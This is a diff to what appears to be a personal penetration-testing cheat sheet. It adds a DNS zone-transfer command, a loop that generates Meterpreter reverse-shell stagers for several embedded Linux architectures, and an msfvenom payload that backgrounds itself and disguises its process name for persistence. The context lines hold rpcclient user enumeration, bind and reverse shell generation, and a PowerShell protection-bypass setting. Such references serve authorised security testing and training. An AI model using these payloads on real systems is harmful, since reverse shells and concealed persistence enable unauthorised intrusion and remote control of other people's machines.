@@ -190,6 +190,15 @@ rpcclient -U 'username%password' -c "enumdomgroups" $HOST
 rpcclient -U 'username%password' -c "enumdomusers" $HOST | awk 'NR%2==0 {print $1}' RS='[' FS=']'
 ```
 
+## DNS Enumeration
+
+Basic enumeration:
+
+```sh
+# Attempt a zone transfer.
+dig axfr hostname.tld @$HOST
+```
+
 ## Local Host Enumeration
 
 This section goes over some automated methods. For manual checks, take a look at [my other pentesting snippet reference](https://pages.brianwel.ch/hacks).
@@ -227,6 +236,9 @@ msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f e
 
 # Linux 32-bit bind shell meterpreter.
 msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86_${LISTEN_PORT}.elf"
+
+# Generating Meterpreter stagers for supported embedded Linux targets.
+for arch in aarch64 armle mipsbe mipsle x64 x86; do msfvenom -p linux/$arch/meterpreter/reverse_tcp LHOST=$LISTEN_HOST LPORT=$LISTEN_PORT -f elf -o "linux_${arch}_met_stager${LISTEN_IP}_${LISTEN_PORT}.elf"; done
 
 # Windows 64-bit reverse shell meterpreter.
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.exe"
@@ -297,6 +309,14 @@ set Powershell::prepend_protections_bypass false
 # payload module for the final connection (i.e., start a listener for a reverse
 # TCP payload).
 run
+```
+
+### Persisting on Linux Boxes
+
+A Meterpreter payload that will background itself and hide its `argv` can be generated with (note that this doesn't appear to work with staged Meterpreter payloads):
+
+```sh
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=eth0 LPORT=12345 MeterpreterTryToFork=true PayloadProcessCommandLine=dummy -f elf -o linux_x64_meterpreter.elf
 ```
 
 ### Authenticated Windows Code Execution Modules
